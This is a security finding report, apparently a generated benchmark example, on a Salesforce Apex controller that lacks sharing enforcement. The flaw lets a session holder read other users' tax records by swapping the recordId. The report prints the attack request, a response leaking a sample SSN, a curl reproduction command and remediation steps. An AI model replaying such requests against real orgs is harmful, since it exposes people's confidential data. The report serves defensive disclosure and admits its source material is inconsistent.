# Security Analysis Report
**System:** TaxGrid Compliance API (Salesforce-Integrated)
**Domain:** Tax Compliance / RegTech
**Example ID:** SF-0098
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.2 | Parameter escalation on `CustomObjectController.getRecord` — attacker extends session scope to read any tax compliance CustomRecord |

---

## Finding 1 — Single-User: Parameter Escalation on CustomRecord Object (Pattern 10.2)

### Summary
The Apex controller `CustomRecordController` on TaxGrid Compliance API (`2b1362de.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the CustomRecord object. Per §5.0 Pattern 10.2, a valid session holder escalates their own session scope by substituting an arbitrary `recordId` to read any victim's tax compliance CustomRecord including SSN and confidential internal notes.

**Context.txt inconsistency (documented):** The Apex class in §4.0 is `CustomRecordController` with method `getCustomRecordDetails`, but the Aura descriptor in §6.0 is `c.CustomObjectController.getRecord` (different class name and method). These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.CustomObjectController.getRecord`
**Affected endpoint:** `POST https://2b1362de.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://2b1362de.lightning.force.com/aura
Authorization: Bearer 00D2B1362DE!AR2b1362de...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D2B1362DE!AR2b1362de...

message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN",
"params":{"recordId":"00162DE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim CustomRecord Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00162DE", "Name": "Victim CustomRecord Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-75-7543"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D2B1362DE!AR2b1362de..."
curl -s -X POST "https://2b1362de.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"00162DE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-75-7543
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CustomRecordController { ... }`
2. `WHERE Id = :recordId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
